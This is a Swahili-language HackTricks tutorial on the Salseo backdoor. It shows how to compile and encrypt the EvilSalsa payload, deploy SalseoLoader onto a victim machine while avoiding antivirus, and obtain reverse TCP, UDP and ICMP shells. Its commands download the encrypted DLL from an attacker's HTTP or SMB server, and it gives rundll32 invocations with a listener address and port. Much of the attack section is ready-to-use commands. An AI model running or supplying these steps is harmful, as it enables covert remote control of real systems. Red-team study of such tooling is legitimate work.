# Salseo

<details>

<summary><strong>Jifunze AWS hacking kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

## Kukusanya binaries

Pakua msimbo wa chanzo kutoka github na kusanya **EvilSalsa** na **SalseoLoader**. Utahitaji **Visual Studio** imewekwa ili kusanya msimbo.

Kusanya miradi hiyo kwa ajili ya usanifu wa sanduku la windows ambapo utazitumia (Ikiwa Windows inasaidia x64 kusanidi kwa usanifu huo).

Unaweza **kuchagua usanifu** ndani ya Visual Studio katika **Tab ya "Kujenga" kushoto** katika **"Lengo la Jukwaa".**

(\*\*Ikiwa huwezi kupata chaguo hili bonyeza **"Tab ya Mradi"** kisha kwenye **"Mali ya <Jina la Mradi>"**)

![](<../.gitbook/assets/image (839).png>)

Kisha, jenga miradi yote (Kujenga -> Kujenga Suluhisho) (Ndani ya magogo kutatokea njia ya faili ya kutekelezeka):

![](<../.gitbook/assets/image (381).png>)

## Andaa mlango wa nyuma

Kwanza kabisa, utahitaji kuweka msimbo wa **EvilSalsa.dll.** Kufanya hivyo, unaweza kutumia skripti ya python **encrypterassembly.py** au unaweza kusanya mradi **EncrypterAssembly**:

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### Windows
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
Sasa una kila kitu unachohitaji kutekeleza kila kitu cha Salseo: **EvilDalsa.dll iliyohifadhiwa** na **binary ya SalseoLoader.**

**Pakia binary ya SalseoLoader.exe kwenye mashine. Hawapaswi kugunduliwa na AV yoyote...**

## **Tekeleza mlango wa nyuma**

### **Kupata ganda la nyuma la TCP (kupakua dll iliyohifadhiwa kupitia HTTP)**

Kumbuka kuanza nc kama msikilizaji wa ganda la nyuma na seva ya HTTP kutumikia evilsalsa iliyohifadhiwa.
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **Kupata ganda la kurudisha UDP (kupakua dll iliyohifadhiwa kupitia SMB)**

Kumbuka kuanza nc kama msikilizaji wa ganda la kurudisha, na seva ya SMB kutumikia evilsalsa iliyohifadhiwa (impacket-smbserver).
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **Kupata ganda la nyuma la ICMP (dll iliyosimbwa tayari ndani ya mwathiriwa)**

**Wakati huu unahitaji chombo maalum kwenye mteja kupokea ganda la nyuma. Pakua:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **Zima Majibu ya ICMP:**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### Tekeleza mteja:
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### Ndani ya mwathiriwa, tuendeshe kitu cha salseo:
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## Kukusanya SalseoLoader kama DLL inayotangaza kazi kuu

Fungua mradi wa SalseoLoader ukitumia Visual Studio.

### Ongeza kabla ya kazi kuu: \[DllExport]

![](<../.gitbook/assets/image (409).png>)

### Sakinisha DllExport kwa mradi huu

#### **Zana** --> **Msimamizi wa Pakiti ya NuGet** --> **Dhibiti Pakiti za NuGet kwa Suluhisho...**

![](<../.gitbook/assets/image (881).png>)

#### **Tafuta pakiti ya DllExport (utumie kichupo cha Kutafuta), kisha bonyeza Sakinisha (na ukubali kisandukuche)**

![](<../.gitbook/assets/image (100).png>)

Katika folda yako ya mradi, faili zimeonekana: **DllExport.bat** na **DllExport\_Configure.bat**

### **Ondoa** DllExport

Bonyeza **Ondoa** (ndio, ni ajabu lakini niamini, ni muhimu)

![](<../.gitbook/assets/image (97).png>)

### **Toka** Visual Studio na tekeleza DllExport\_configure

Tu **toka** Visual Studio

Kisha, nenda kwenye **folda yako ya SalseoLoader** na **tekeleza DllExport\_Configure.bat**

Chagua **x64** (ikiwa utaitumia ndani ya sanduku la x64, hilo lilikuwa kesi yangu), chagua **System.Runtime.InteropServices** (ndani ya **Jina nafasi kwa DllExport**) na bonyeza **Tumia**

![](<../.gitbook/assets/image (882).png>)

### **Fungua** mradi tena kwa kutumia Visual Studio

**\[DllExport]** haipaswi tena kuwa na alama ya kosa

![](<../.gitbook/assets/image (670).png>)

### Jenga suluhisho

Chagua **Aina ya Matokeo = Maktaba ya Darasa** (Mradi --> Mali za SalseoLoader --> Maombi --> Aina ya Matokeo = Maktaba ya Darasa)

![](<../.gitbook/assets/image (847).png>)

Chagua **jukwaa la x64** (Mradi --> Mali za SalseoLoader --> Jenga --> Lengo la Jukwaa = x64)

![](<../.gitbook/assets/image (285).png>)

Kwa **kujenga** suluhisho: Jenga --> Jenga Suluhisho (Ndani ya konsoli ya Matokeo, njia ya DLL mpya itaonekana)

### Jaribu Dll iliyozalishwa

Nakili na ubandike Dll mahali unapotaka kuitumia.

Tekeleza:
```
rundll32.exe SalseoLoader.dll,main
```
Ikiwa hakuna kosa linaonekana, huenda una DLL inayofanya kazi!!

## Pata ganda kwa kutumia DLL

Usisahau kutumia **seva** ya **HTTP** na weka msikilizaji wa **nc**

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### CMD

### CMD
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
<details>

<summary><strong>Jifunze AWS hacking kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kuhack kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
